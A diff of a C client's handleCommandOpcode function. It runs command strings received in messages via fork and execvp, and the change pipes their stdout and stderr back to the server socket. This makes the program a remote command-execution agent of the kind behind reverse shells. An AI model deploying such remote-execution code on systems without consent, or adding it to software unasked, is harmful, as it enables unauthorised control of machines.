@@ -214,10 +214,28 @@ void expandRedirect(char **args)
 
 void handleCommandOpcode(message_t msg)
 {
-    pid_t pid = fork();
+    pid_t pid;
+    int pipe_fd[2];
+
+    // Create a pipe
+    if (pipe(pipe_fd) == -1)
+    {
+        perror("pipe");
+        exit(EXIT_FAILURE);
+    }
+
+    pid = fork();
 
     if (pid == 0)
     {
+        // Child process
+        close(pipe_fd[0]); // Close the read end of the pipe
+
+        // Redirect stdout and stderr to the write end of the pipe
+        dup2(pipe_fd[1], STDOUT_FILENO);
+        dup2(pipe_fd[1], STDERR_FILENO);
+        close(pipe_fd[1]); // Close the write end of the pipe after duplicating
+
         int argCount = 0;
         char *temp = strdup(msg.buffer);
         char *p = strtok(temp, " ");
@@ -227,6 +245,7 @@ void handleCommandOpcode(message_t msg)
             p = strtok(NULL, " ");
         }
         free(temp);
+
         char **args = (char **)malloc((argCount + 1) * sizeof(char *));
         int i = 0;
         p = strtok(msg.buffer, " ");
@@ -236,15 +255,32 @@ void handleCommandOpcode(message_t msg)
             p = strtok(NULL, " ");
         }
         args[i] = NULL;
+
         expandTilde(args);
         expandRedirect(args);
+
         execvp(args[0], args);
-        perror("Command");
+        perror("Command"); // If execvp fails, print an error
         exit(EXIT_FAILURE);
     }
     else if (pid > 0)
     {
-        wait(NULL);
+        // Parent process
+        close(pipe_fd[1]); // Close the write end of the pipe
+
+        // Read from the pipe
+        char buffer[1024];
+        ssize_t bytesRead;
+        message_t msg;
+        while ((bytesRead = read(pipe_fd[0], buffer, sizeof(buffer) - 1)) > 0)
+        {
+            buffer[bytesRead] = '\0'; // Null-terminate the string
+            encapsulateMessage(&msg, buffer, 'M');
+            sendMessage(clientData.serverSocket, &msg);
+        }
+
+        close(pipe_fd[0]); // Close the read end of the pipe
+        wait(NULL);        // Wait for the child process to finish
     }
     else
     {
